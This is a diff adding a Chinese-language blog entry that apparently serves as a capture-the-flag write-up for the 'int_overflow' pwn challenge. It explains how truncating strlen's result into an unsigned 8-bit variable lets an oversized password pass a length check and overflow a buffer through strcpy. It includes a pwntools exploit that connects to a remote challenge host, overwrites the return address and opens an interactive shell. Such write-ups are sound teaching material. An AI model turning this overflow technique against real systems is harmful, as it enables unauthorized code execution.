@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>int_overflow</title>
+      <link href="/2022/12/31/int-overflow/"/>
+      <url>/2022/12/31/int-overflow/</url>
+      
+        <content type="html"><![CDATA[<h2 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow  wp"></a>int_overflow  wp</h2><p>这题涉及到了整数溢出漏洞，值得写一篇博客。<br>先checksec一下：<br><img src="/images/int-overflow/1.png"><br>只开了NX保护机制<br>拖入IDA查看：<br><img src="/images/int-overflow/2.png"><br>主函数里没有什么可以利用的<br>打开login（）函数：<br><img src="/images/int-overflow/3.png"><br>有read函数但是无法溢出……打开check_passwd函数这里涉及到一个知识点unsigned_int8定义的是一个无符号型8位整数<br>具体解释如下：</p><pre class="line-numbers language-none"><code class="language-none">int8取值范围是-128 - 127unsigned int8 0-255Int16 意思是16位整数(16bit integer)，相当于short 占2个字节 -32768 ~ 32767Int32 意思是32位整数(32bit integer), 相当于 int 占4个字节 -2147483648 ~ 2147483647Int64 意思是64位整数(64bit interger), 相当于 long long 占8个字节 -9223372036854775808 ~ 9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里涉及到一个整数溢出：strlen函数读取buf的字符长度以int类型返回是32位字节的，而将它赋给了v3如果返回值大于255则会发生整数溢出，将高位字节截断保留低位字节<br>我们看到if函数的else部分是我们可以利用的，有个危险函数strcpy（）可以复制任意长度字符串，这里可以将s的字符串复制到dest数组并发生溢出<br>那思路就拟好了先让v3在4~8区间内判断到else区间执行然后该怎么覆盖怎么覆盖<br>dest的栈空间如下：<br><img src="/images/int-overflow/4.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">63036</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804868b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">232</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"username:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"passwd:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/int-overflow/5.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>guess_num</title>
       <link href="/2022/12/28/guess-num/"/>
       <url>/2022/12/28/guess-num/</url>
